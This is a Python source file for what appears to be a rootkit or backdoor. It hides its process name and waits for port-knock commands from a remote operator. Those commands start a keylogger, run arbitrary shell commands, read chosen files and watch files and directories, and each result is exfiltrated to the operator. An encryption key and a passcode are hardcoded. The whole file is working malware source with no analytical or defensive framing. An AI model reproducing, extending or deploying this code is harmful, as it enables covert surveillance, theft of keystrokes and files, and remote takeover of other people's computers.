import warnings
warnings.filterwarnings(action="ignore")
import subprocess
import d_watcher
from keylog import keylog
import setproctitle
import f_watcher
import knock

key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
code = "secret"


def main():
    kit = rkit()
    kit.start()


class rkit:
    def __init__(self):
        self.knocker = knock.remote_receiver(code, key, self)
        self.keylogger = keylog(60)
        self.file_watcher = f_watcher.file_watcher(self)
        self.dictionary_watcher = d_watcher.directory_watcher(self)

    def start(self):
        self.proc_name("secret")
        self.knocker.listen_loop()

    @staticmethod
    def proc_name(name):
        setproctitle.setproctitle(name)

    def action_parse(self, option, data=""):
        match option:
            case 1:
                self.keylogger.start()
                return 0
            case 2:
                self.keylogger.stop()
                return 0
            case 3:
                self.command_execute(data)
                return 0
            case 4:
                self.file_get(data)
                return 0
            case 5:
                self.file_watcher.assign_file(data)
                self.file_watcher.start()
                return 0
            case 6:
                self.file_watcher.stop()
                return 0
            case 7:
                self.dictionary_watcher.assign_directory(data)
                self.dictionary_watcher.start()
                return 0
            case 8:
                self.dictionary_watcher.stop()
                return 0
            case _:
                # print("Invalid action received")
                return 0

    def command_execute(self, command):
        try:
            out = subprocess.check_output(command, shell=True)
            self.knocker.exfiltrate(out.decode("utf-8"), "/")
        except subprocess.CalledProcessError as e:
            self.knocker.exfiltrate("Command "+command+" not found", "/")

    def file_get(self, file):
        try:
            f = open(file, "r+")
            data = f.read()
            if "/" in file:
                file_name = file[file.rindex("/") + 1:]
            else:
                file_name = file
            self.knocker.exfiltrate(data, file_name)
        except FileNotFoundError:
            self.knocker.exfiltrate("File " + file + " not found", "/")
        finally:
            f.close()
        return "file"


if __name__ == '__main__':
    main()
